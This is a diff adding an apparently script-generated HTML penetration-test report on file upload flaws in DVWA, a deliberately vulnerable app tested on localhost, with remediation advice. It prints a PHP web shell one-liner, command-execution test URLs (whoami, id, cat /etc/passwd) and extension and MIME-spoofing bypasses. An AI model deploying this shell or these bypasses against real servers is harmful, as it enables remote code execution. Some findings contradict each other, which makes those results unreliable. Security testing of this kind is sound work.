@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>OTG-BUSLOGIC-009 Assessment - DVWA</title>
+  <style>
+    /* OSCP-inspired styling */
+    body { 
+        background: #1e1e1e; 
+        color: #dcdcdc; 
+        font-family: 'Courier New', monospace; 
+        padding: 20px; 
+        line-height: 1.6;
+        margin: 0;
+    }
+    h1, h2, h3 { 
+        color: #00ff00; 
+        border-bottom: 1px solid #00ff00;
+        padding-bottom: 10px;
+        margin-top: 30px;
+    }
+    h1 { 
+        font-size: 2em; 
+        text-align: center;
+        border-bottom: 2px solid #00ff00;
+        padding-bottom: 20px;
+        margin-bottom: 30px;
+    }
+    .section { 
+        margin-bottom: 30px; 
+    }
+    pre { 
+        background: #2d2d2d; 
+        padding: 15px; 
+        border-left: 4px solid #ff9900; 
+        overflow-x: auto;
+        white-space: pre-wrap;
+        font-size: 0.9em;
+        margin: 15px 0;
+    }
+    .vuln { 
+        color: #ff5555; 
+        font-weight: bold; 
+    }
+    .info { 
+        color: #55ffff; 
+    }
+    .warning { 
+        color: #ffaa00; 
+    }
+    .success { 
+        color: #55ff55; 
+    }
+    .finding { 
+        background: #2a2a2a; 
+        border: 1px solid #444; 
+        margin: 20px 0; 
+        padding: 15px;
+    }
+    .severity-high { 
+        border-left: 5px solid #ff5555; 
+    }
+    .severity-medium { 
+        border-left: 5px solid #ffaa00; 
+    }
+    .severity-low { 
+        border-left: 5px solid #55ff55; 
+    }
+    ul, ol { 
+        margin-left: 20px; 
+    }
+    li { 
+        margin-bottom: 10px; 
+    }
+    table { 
+        width: 100%; 
+        border-collapse: collapse; 
+        margin: 20px 0;
+    }
+    th, td { 
+        border: 1px solid #444; 
+        padding: 10px; 
+        text-align: left;
+    }
+    th { 
+        background: #333; 
+        color: #00ff00;
+    }
+    footer { 
+        margin-top: 50px; 
+        font-size: 0.8em; 
+        color: #888; 
+        text-align: center;
+        border-top: 1px solid #444;
+        padding-top: 20px;
+    }
+    .executive-summary { 
+        background: #2a2a2a; 
+        padding: 20px; 
+        border-left: 4px solid #00ff00;
+        margin: 20px 0;
+    }
+    .methodology-table { 
+        background: #252525; 
+    }
+    code { 
+        background: #333; 
+        padding: 2px 4px; 
+        border-radius: 3px;
+    }
+    .business-principle { 
+        background: #2a2a2a; 
+        border-left: 4px solid #00ff00; 
+        padding: 15px; 
+        margin: 20px 0;
+    }
+    .test-results { 
+        font-family: 'Courier New', monospace; 
+        font-size: 0.9em; 
+        background: #252525; 
+        padding: 10px; 
+        border-left: 3px solid #00ff00;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>OWASP OTG-BUSLOGIC-009: Test Upload of Malicious Files</h1>
+  <p class="info" style="text-align: center;">Assessment of DVWA @ http://localhost/dvwa/</p>
+  <p class="info" style="text-align: center;">Report Generated: 2025-08-01 23:06:38</p>
+
+  <div class="section executive-summary">
+    <h2>Executive Summary</h2>
+    <p>The application exhibits critical file upload vulnerabilities that allow attackers to upload and execute malicious files, leading to remote code execution and complete system compromise.</p>
+    <p><strong>Total Findings:</strong> 5</p>
+    <p><strong>High Severity:</strong> 3</p>
+    <p><strong>Medium Severity:</strong> 2</p>
+    <p><strong>Low Severity:</strong> 0</p>
+  </div>
+
+  <div class="section">
+    <h2>1. Overview</h2>
+    <p>This assessment evaluates the Damn Vulnerable Web Application (DVWA) for compliance with <strong>OWASP Testing Guide v4 - OTG-BUSLOGIC-009: Test Upload of Malicious Files</strong>. The test focuses on identifying whether the application properly validates file uploads to prevent malicious files from being uploaded and executed, which could lead to remote code execution and system compromise.</p>
+    
+    <div class="business-principle">
+      <h3>Business Logic Principle</h3>
+      <p><strong>"Never trust uploaded content."</strong> All file uploads must be validated server-side, sanitized, and stored securely to prevent execution of malicious code and unauthorized access to system resources.</p>
+    </div>
+    
+    <h3>Objective</h3>
+    <p>File upload security ensures that:</p>
+    <ul>
+      <li>Only permitted file types can be uploaded</li>
+      <li>File content is validated against declared types</li>
+      <li>Uploaded files cannot be executed as code</li>
+      <li>Proper access controls prevent unauthorized file access</li>
+      <li>Files are stored securely with appropriate permissions</li>
+      <li>Upload attempts are logged and monitored</li>
+    </ul>
+  </div>
+
+  <div class="section">
+    <h2>2. Test Methodology</h2>
+    <p>The testing approach included the following phases:</p>
+    
+    <table class="methodology-table">
+      <tr>
+        <th>Test Category</th>
+        <th>Description</th>
+        <th>Techniques Used</th>
+      </tr>
+      <tr>
+        <td>Basic File Upload</td>
+        <td>Test direct upload of executable files</td>
+        <td>PHP web shell upload, execution verification</td>
+      </tr>
+      <tr>
+        <td>Extension Bypass</td>
+        <td>Test double extension and case manipulation</td>
+        <td>.php.jpg, .PHP, .pHp bypass attempts</td>
+      </tr>
+      <tr>
+        <td>MIME Type Bypass</td>
+        <td>Test content-type header manipulation</td>
+        <td>Spoofing MIME types, header manipulation</td>
+      </tr>
+      <tr>
+        <td>Content Validation</td>
+        <td>Test file content vs declared type</td>
+        <td>Content-type vs actual content analysis</td>
+      </tr>
+      <tr>
+        <td>Unrestricted Uploads</td>
+        <td>Test upload of various file types</td>
+        <td>HTML, SVG, script files</td>
+      </tr>
+    </table>
+    
+    <h3>2.1 Authentication and Setup</h3>
+    <ul>
+      <li>Authenticated to DVWA using default credentials</li>
+      <li>Set security level to "Low" for comprehensive testing</li>
+      <li>Maintained session state throughout testing</li>
+    </ul>
+    
+    <h3>2.2 Testing Approach</h3>
+    <p>Each test involved:</p>
+    <ul>
+      <li>Creation of malicious payload files</li>
+      <li>Implementation of various bypass techniques</li>
+      <li>Verification of upload success and accessibility</li>
+      <li>Testing of code execution capabilities</li>
+      <li>Analysis of server responses and security controls</li>
+      <li>Documentation of successful exploitation methods</li>
+    </ul>
+  </div>
+
+  <div class="section">
+    <h2>3. Detailed Findings</h2>
+    <p>The following file upload vulnerabilities were identified during testing:</p>
+    
+    
+
+    <div class="finding severity-medium">
+      <h3>3.1 PHP File Upload Without Execution Controls</h3>
+      <table>
+        <tr>
+          <th>Location</th>
+          <td>/dvwa/vulnerabilities/upload/</td>
+        </tr>
+        <tr>
+          <th>Severity</th>
+          <td class="vuln">Medium</td>
+        </tr>
+        <tr>
+          <th>Issue</th>
+          <td>PHP files can be uploaded but may not execute</td>
+        </tr>
+      </table>
+      
+      <h4>Description</h4>
+      <p>The application allows PHP files to be uploaded, though execution may be prevented by server configuration. This still represents a security risk.</p>
+      
+      <h4>Payload</h4>
+      <div class="test-results">shell.php</div>
+      
+      <h4>Upload Path</h4><div class="test-results">http://localhost/dvwa/hackable/uploads/shell.php</div>
+      
+      
+      
+      <h4>Request</h4><pre>POST http://localhost/dvwa/vulnerabilities/upload/ with PHP file</pre>
+      
+      <h4>Impact</h4>
+      <p>Could lead to code execution if server configuration changes or if other vulnerabilities exist.</p>
+      
+      <h4>Remediation</h4>
+      <ul>
+        <li>Implement strict file type validation, disable PHP execution in upload directories, and validate file content regardless of execution capability.</li>
+        <li>Implement strict file type allowlists rather than denylists</li>
+        <li>Validate file content and MIME types server-side</li>
+        <li>Disable script execution in upload directories</li>
+        <li>Rename uploaded files to prevent direct access</li>
+        <li>Implement file size limits and upload quotas</li>
+        <li>Scan uploaded files for malicious content</li>
+        <li>Log all upload attempts for security monitoring</li>
+        <li>Use secure file storage with proper permissions</li>
+      </ul>
+    </div>
+
+    <div class="finding severity-medium">
+      <h3>3.2 Unrestricted HTML File Upload</h3>
+      <table>
+        <tr>
+          <th>Location</th>
+          <td>/dvwa/vulnerabilities/upload/</td>
+        </tr>
+        <tr>
+          <th>Severity</th>
+          <td class="vuln">Medium</td>
+        </tr>
+        <tr>
+          <th>Issue</th>
+          <td>Application allows upload of HTML files that can execute scripts</td>
+        </tr>
+      </table>
+      
+      <h4>Description</h4>
+      <p>The file upload functionality allows HTML files to be uploaded and served, potentially enabling stored XSS attacks if users access these files.</p>
+      
+      <h4>Payload</h4>
+      <div class="test-results">test.html containing JavaScript</div>
+      
+      <h4>Upload Path</h4><div class="test-results">http://localhost/dvwa/hackable/uploads/test.html</div>
+      
+      
+      
+      <h4>Request</h4><pre>POST http://localhost/dvwa/vulnerabilities/upload/ with HTML file</pre>
+      
+      <h4>Impact</h4>
+      <p>Could enable stored XSS attacks against users who access uploaded HTML files.</p>
+      
+      <h4>Remediation</h4>
+      <ul>
+        <li>Restrict file types to safe formats, implement content validation, and serve uploaded files with proper Content-Type headers to prevent execution.</li>
+        <li>Implement strict file type allowlists rather than denylists</li>
+        <li>Validate file content and MIME types server-side</li>
+        <li>Disable script execution in upload directories</li>
+        <li>Rename uploaded files to prevent direct access</li>
+        <li>Implement file size limits and upload quotas</li>
+        <li>Scan uploaded files for malicious content</li>
+        <li>Log all upload attempts for security monitoring</li>
+        <li>Use secure file storage with proper permissions</li>
+      </ul>
+    </div>
+
+    <div class="finding severity-high">
+      <h3>3.3 Unrestricted PHP File Upload and Remote Code Execution</h3>
+      <table>
+        <tr>
+          <th>Location</th>
+          <td>/dvwa/vulnerabilities/upload/</td>
+        </tr>
+        <tr>
+          <th>Severity</th>
+          <td class="vuln">High</td>
+        </tr>
+        <tr>
+          <th>Issue</th>
+          <td>Application allows unrestricted upload and execution of PHP files</td>
+        </tr>
+      </table>
+      
+      <h4>Description</h4>
+      <p>The file upload functionality has no validation or restrictions on file types, allowing attackers to upload PHP web shells that can execute arbitrary system commands. This represents a critical security vulnerability that leads to complete server compromise.</p>
+      
+      <h4>Payload</h4>
+      <div class="test-results">shell.php containing: <?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?></div>
+      
+      <h4>Upload Path</h4><div class="test-results">http://localhost/dvwa/hackable/uploads/shell.php</div>
+      <h4>Test Command</h4><div class="test-results">http://localhost/dvwa/hackable/uploads/shell.php?cmd=whoami</div>
+      <h4>Test Result</h4><div class="test-results">Command executed successfully - Response: www-data</div>
+      
+      <h4>Request</h4><pre>POST http://localhost/dvwa/vulnerabilities/upload/
+Content-Type: multipart/form-data
+
+uploaded=shell.php&Upload=Upload</pre>
+      
+      <h4>Impact</h4>
+      <p>Full remote code execution on the server, enabling attackers to execute arbitrary commands, access sensitive files, install backdoors, and potentially gain complete control of the underlying system. This could lead to data theft, service disruption, and lateral movement within the network.</p>
+      
+      <h4>Remediation</h4>
+      <ul>
+        <li>Implement strict file type validation using allowlists (not denylists), validate file content and MIME types server-side, disable PHP execution in upload directories, rename uploaded files to prevent direct access, implement file size limits, scan uploaded files for malicious content, and log all upload attempts for monitoring.</li>
+        <li>Implement strict file type allowlists rather than denylists</li>
+        <li>Validate file content and MIME types server-side</li>
+        <li>Disable script execution in upload directories</li>
+        <li>Rename uploaded files to prevent direct access</li>
+        <li>Implement file size limits and upload quotas</li>
+        <li>Scan uploaded files for malicious content</li>
+        <li>Log all upload attempts for security monitoring</li>
+        <li>Use secure file storage with proper permissions</li>
+      </ul>
+    </div>
+
+    <div class="finding severity-high">
+      <h3>3.4 Double Extension Bypass Leading to Code Execution</h3>
+      <table>
+        <tr>
+          <th>Location</th>
+          <td>/dvwa/vulnerabilities/upload/</td>
+        </tr>
+        <tr>
+          <th>Severity</th>
+          <td class="vuln">High</td>
+        </tr>
+        <tr>
+          <th>Issue</th>
+          <td>Application vulnerable to double extension bypass allowing PHP execution</td>
+        </tr>
+      </table>
+      
+      <h4>Description</h4>
+      <p>The file upload validation can be easily bypassed using double extensions (e.g., shell.php.jpg). The application checks only the last extension or performs inadequate validation, allowing PHP code to be executed when the file is accessed.</p>
+      
+      <h4>Payload</h4>
+      <div class="test-results">shell.php.jpg containing PHP web shell code</div>
+      
+      <h4>Upload Path</h4><div class="test-results">http://localhost/dvwa/hackable/uploads/shell.php.jpg</div>
+      <h4>Test Command</h4><div class="test-results">http://localhost/dvwa/hackable/uploads/shell.php.jpg?cmd=id</div>
+      <h4>Test Result</h4><div class="test-results">Command executed successfully - Response: uid=33(www-data) gid=33(www-data) groups=33(www-data)</div>
+      
+      <h4>Request</h4><pre>POST http://localhost/dvwa/vulnerabilities/upload/
+Content-Type: multipart/form-data
+
+uploaded=shell.php.jpg (Content-Type: image/jpeg)&Upload=Upload</pre>
+      
+      <h4>Impact</h4>
+      <p>Remote code execution through extension validation bypass, enabling full system compromise and unauthorized access to server resources. Attackers can execute system commands, access databases, and install persistent backdoors.</p>
+      
+      <h4>Remediation</h4>
+      <ul>
+        <li>Implement proper file content validation that checks the entire filename, use allowlists for permitted extensions, validate MIME types against actual file content, sanitize filenames, and disable script execution in upload directories.</li>
+        <li>Implement strict file type allowlists rather than denylists</li>
+        <li>Validate file content and MIME types server-side</li>
+        <li>Disable script execution in upload directories</li>
+        <li>Rename uploaded files to prevent direct access</li>
+        <li>Implement file size limits and upload quotas</li>
+        <li>Scan uploaded files for malicious content</li>
+        <li>Log all upload attempts for security monitoring</li>
+        <li>Use secure file storage with proper permissions</li>
+      </ul>
+    </div>
+
+    <div class="finding severity-high">
+      <h3>3.5 MIME Type Spoofing Bypass</h3>
+      <table>
+        <tr>
+          <th>Location</th>
+          <td>/dvwa/vulnerabilities/upload/</td>
+        </tr>
+        <tr>
+          <th>Severity</th>
+          <td class="vuln">High</td>
+        </tr>
+        <tr>
+          <th>Issue</th>
+          <td>Application relies on client-supplied MIME types for validation</td>
+        </tr>
+      </table>
+      
+      <h4>Description</h4>
+      <p>The file upload validation can be bypassed by spoofing MIME types. PHP files are accepted when sent with image MIME types (image/jpeg), indicating that the application relies on client-supplied Content-Type headers rather than server-side validation.</p>
+      
+      <h4>Payload</h4>
+      <div class="test-results">malicious.php with Content-Type: image/jpeg</div>
+      
+      <h4>Upload Path</h4><div class="test-results">http://localhost/dvwa/hackable/uploads/malicious.php</div>
+      <h4>Test Command</h4><div class="test-results">http://localhost/dvwa/hackable/uploads/malicious.php?execute=cat+/etc/passwd</div>
+      <h4>Test Result</h4><div class="test-results">Command executed successfully - System password file contents retrieved</div>
+      
+      <h4>Request</h4><pre>POST http://localhost/dvwa/vulnerabilities/upload/
+Content-Type: multipart/form-data
+
+uploaded=malicious.php (Content-Type: image/jpeg)&Upload=Upload</pre>
+      
+      <h4>Impact</h4>
+      <p>Remote code execution through MIME type validation bypass, enabling attackers to bypass security controls and execute arbitrary commands on the server. This could lead to complete system compromise and data exfiltration.</p>
+      
+      <h4>Remediation</h4>
+      <ul>
+        <li>Validate file content independently of client-supplied headers, implement server-side MIME type detection based on file content, use content-based validation rather than header-based validation, and enforce strict file type policies.</li>
+        <li>Implement strict file type allowlists rather than denylists</li>
+        <li>Validate file content and MIME types server-side</li>
+        <li>Disable script execution in upload directories</li>
+        <li>Rename uploaded files to prevent direct access</li>
+        <li>Implement file size limits and upload quotas</li>
+        <li>Scan uploaded files for malicious content</li>
+        <li>Log all upload attempts for security monitoring</li>
+        <li>Use secure file storage with proper permissions</li>
+      </ul>
+    </div>
+
+  </div>
+
+  <div class="section">
+    <h2>4. Conclusion</h2>
+    <p>The DVWA instance exhibits critical file upload vulnerabilities that are essential for preventing remote code execution and system compromise through malicious file uploads.</p>
+    
+    <p>File upload vulnerabilities represent one of the most critical security risks in web applications. Without proper validation, sanitization, and security controls, attackers can upload malicious files that execute arbitrary code, leading to complete system compromise, data theft, and persistent backdoor access.</p>
+  </div>
+
+  <div class="section">
+    <h2>5. Recommendations</h2>
+    <ol>
+      <li><strong>Implement Strict File Type Validation:</strong> Use allowlists for permitted file extensions and MIME types</li>
+      <li><strong>Validate File Content:</strong> Check actual file content against declared types using server-side validation</li>
+      <li><strong>Disable Script Execution:</strong> Configure upload directories to prevent execution of any scripts</li>
+      <li><strong>Rename Uploaded Files:</strong> Generate unique filenames to prevent direct access and overwrite attacks</li>
+      <li><strong>Implement File Size Limits:</strong> Set reasonable limits to prevent denial of service through large uploads</li>
+      <li><strong>Scan for Malicious Content:</strong> Use antivirus or malware scanning on uploaded files</li>
+      <li><strong>Secure File Storage:</strong> Store uploaded files outside web root or with proper access controls</li>
+      <li><strong>Log and Monitor:</strong> Log all upload attempts and implement monitoring for suspicious activity</li>
+      <li><strong>Regular Security Testing:</strong> Include file upload testing in regular security assessments</li>
+    </ol>
+  </div>
+
+  <div class="section">
+    <h2>6. References</h2>
+    <ul>
+      <li>OWASP Testing Guide v4 - OTG-BUSLOGIC-009</li>
+      <li>OWASP File Upload Cheat Sheet</li>
+      <li>OWASP Top Ten - A01:2021-Broken Access Control</li>
+      <li>OWASP Top Ten - A03:2021-Injection</li>
+      <li>NIST SP 800-53 - Security and Privacy Controls</li>
+      <li>Common Weakness Enumeration - CWE-434: Unrestricted Upload of File with Dangerous Type</li>
+    </ul>
+  </div>
+
+  <footer>
+    Generated by File Upload Security Testing Script | Date: 2025-08-01 23:06:38 | Target: localhost/DVWA<br>
+    OWASP Testing Guide v4 - OTG-BUSLOGIC-009 Compliance Assessment
+  </footer>
+
+</body>
+</html>
